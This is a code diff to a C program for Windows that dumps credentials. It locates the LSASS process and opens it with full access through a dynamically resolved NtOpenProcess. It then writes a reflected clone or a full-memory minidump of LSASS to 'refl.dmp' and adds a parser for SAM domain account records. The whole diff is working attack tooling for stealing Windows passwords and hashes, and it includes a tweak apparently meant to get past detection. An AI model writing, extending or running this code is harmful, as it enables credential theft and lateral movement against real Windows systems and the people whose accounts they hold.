@@ -15,6 +15,61 @@
 #include <windows.h>
 #include <winnt.h>
 
+#define InitializeObjectAttributes(p)                                          \
+  (p)->Length = sizeof(OBJECT_ATTRIBUTES);                                     \
+  (p)->RootDirectory = NULL;                                                   \
+  (p)->Attributes = 0;                                                         \
+  (p)->ObjectName = NULL;                                                      \
+  (p)->SecurityDescriptor = NULL;                                              \
+  (p)->SecurityQualityOfService = NULL;
+
+int domain_account_f_unmarshal(domain_account_f *self, const uint8_t *data,
+                               size_t data_len) {
+  if (data_len < 104) {
+    fprintf(stderr, "Not enough data to unmarshal a DOMAIN_ACCOUNT_F\n");
+    return -1;
+  }
+
+  self->Revision = read_le16(data + 0);
+  self->CreationTime = read_le64(data + 8);
+  self->DomainModifiedAccount = read_le64(data + 16);
+  self->MaxPasswordAge = read_le64(data + 24);
+  self->MinPasswordAge = read_le64(data + 32);
+  self->ForceLogoff = read_le64(data + 40);
+  self->LockoutDuration = read_le64(data + 48);
+  self->LockoutObservationWindow = read_le64(data + 56);
+  self->ModifiedCountAtLastPromotion = read_le64(data + 64);
+  self->NextRid = read_le32(data + 72);
+  self->PasswordProperties = read_le32(data + 76);
+  self->MinPasswordLength = read_le16(data + 80);
+  self->PasswordHistoryLength = read_le16(data + 82);
+  self->LockoutThreshold = read_le16(data + 84);
+  self->ServerState = read_le32(data + 88);
+  self->ServerRole = read_le32(data + 92);
+  self->UasCompatibilityRequired = read_le32(data + 96);
+
+  self->Data = NULL;
+  self->DataLen = 0;
+
+  if (data_len > 104) {
+    self->DataLen = data_len - 104;
+    self->Data = malloc(self->DataLen);
+    if (!self->Data) {
+      fprintf(stderr, "Failed to allocate memory for Data\n");
+      return -1;
+    }
+    memcpy(self->Data, data + 104, self->DataLen);
+  }
+
+  return 0;
+}
+
+void domain_account_f_free(domain_account_f *self) {
+  free(self->Data);
+  self->Data = NULL;
+  self->DataLen = 0;
+}
+
 // locate lsass
 HANDLE Find() {
   HANDLE procFound = NULL;
@@ -122,6 +177,8 @@ NTSTATUS Clone(HANDLE pid) {
   RtlCreateProcessReflection =
       (RtlCreateProcessReflection_t)get_function_from_exports(
           ntdll, "RtlCreateProcessReflection");
+  NtOpenProcess_t NtOpenProcess =
+      (NtOpenProcess_t)get_function_from_exports(ntdll, "NtOpenProcess");
 
   // resolve PID from input handle
   DWORD lsassPID = (DWORD)(uintptr_t)pid;
@@ -130,7 +187,14 @@ NTSTATUS Clone(HANDLE pid) {
     return 1;
   }
 
-  HANDLE newLass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
+  OBJECT_ATTRIBUTES obj;
+  CLIENT_ID cid;
+  cid.UniqueProcess = pid;
+  cid.UniqueThread = NULL;
+  InitializeObjectAttributes(&obj);
+  HANDLE newLass;
+  NTSTATUS status = NtOpenProcess(&newLass, PROCESS_ALL_ACCESS, &obj, &cid);
+  // HANDLE newLass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
   if (!newLass) {
     printf("OpenProcess failed: %d\n", GetLastError());
     return 1;
@@ -139,11 +203,6 @@ NTSTATUS Clone(HANDLE pid) {
 
   HANDLE outFile = CreateFileA("refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, NULL);
-  // if (outFile == INVALID_HANDLE_VALUE) {
-  //   printf("CreateFile failed: %d\n", GetLastError());
-  //   CloseHandle(newLass);
-  //   return 1;
-  // }
 
   t_refl_args args = {0};
   args.orig_hndl = newLass;
@@ -163,7 +222,7 @@ NTSTATUS Clone(HANDLE pid) {
     return 1;
   }
 
-  DWORD wait = WaitForSingleObject(hThread, 10000);
+  DWORD wait = WaitForSingleObject(hThread, 20000);
   CloseHandle(hThread);
 
   if (wait == WAIT_TIMEOUT) {
@@ -206,6 +265,34 @@ void bytes_to_hex(unsigned char *src, size_t len, char *dest) {
     sprintf(dest + (i * 2), "%02X", src[i]);
   }
   dest[len * 2] = '\0'; // Null-terminate the final string
+}
+
+NTSTATUS DumpLsa(HANDLE pid) {
+  ntdll = get_mod_base("ntdll.dll");
+  NTSTATUS status;
+  NtOpenProcess_t NtOpenProcess =
+      (NtOpenProcess_t)get_function_from_exports(ntdll, "NtOpenProcess");
+  // prepare object attributes
+  OBJECT_ATTRIBUTES obj;
+  CLIENT_ID cid;
+  HANDLE lsassProcessHandle;
+  cid.UniqueProcess = pid;
+  cid.UniqueThread = NULL;
+  InitializeObjectAttributes(&obj);
+  status = NtOpenProcess(&lsassProcessHandle, PROCESS_ALL_ACCESS, &obj, &cid);
+  if (status != 0) {
+
+    return status;
+  }
+  HANDLE outFile =
+      CreateFileA("refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
+                  FILE_ATTRIBUTE_NORMAL, NULL); // create a dump file.
+
+  DWORD lsassPid = GetProcessId(lsassProcessHandle);
+  BOOL dumped = MiniDumpWriteDump(lsassProcessHandle, lsassPid, outFile,
+                                  MiniDumpWithFullMemory, NULL, NULL, NULL);
+
+  return status;
 }
 
 const int MAXREGVAL = 1024;
